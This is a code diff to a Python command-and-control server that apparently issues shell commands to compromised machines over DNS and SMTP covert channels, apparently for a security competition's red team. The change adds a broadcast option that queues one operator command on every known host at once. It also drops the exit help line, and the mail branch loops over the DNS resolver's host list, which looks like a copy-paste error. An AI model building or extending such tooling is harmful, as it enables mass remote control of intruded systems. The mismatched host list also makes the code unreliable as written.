@@ -5,6 +5,7 @@ import smtp.server
 from dns.server import MemeResolver
 from dnslib.server import *
 import asyncore
+import sys
 
 def machineList(machines):
     if len(machines) == 0:
@@ -25,7 +26,6 @@ def printHelp():
     print("         c2i  - Set the IP or FQDN of the ISTS C2")
     print("         c2e  - Enable running commands from ISTS C2")
     print("         c2d  - Disable running commands from ISTS C2")
-    print("         exit - Exit and stop running the server")
     print("         help - This help again")
 
 def main():
@@ -56,6 +56,10 @@ def main():
                     target = int(cmd.split(" ")[1])
                     targetCmd = input("Target$ ")
                     resolver.waitingCommands[resolver.knownHosts[target]] = targetCmd
+                elif cmd[1] == "a":
+                    targetCmd = input("Target$ ")
+                    for t in resolver.knownHosts:
+                        resolver.waitingCommands[t] = targetCmd
                 else:
                     print("Unknown command.")
             elif cmd[0] == "m" or cmd[0] == "s":
@@ -65,6 +69,10 @@ def main():
                     target = int(cmd.split(" ")[1])
                     targetCmd = input("Target$ ")
                     mail.waitingCommands[mail.knownHosts[target]] = targetCmd
+                elif cmd[1] == "a":
+                    targetCmd = input("Target$ ")
+                    for t in resolver.knownHosts:
+                        mail.waitingCommands[t] = targetCmd
                 else:
                     print("Unknown command.")
             elif cmd[0] == "c":
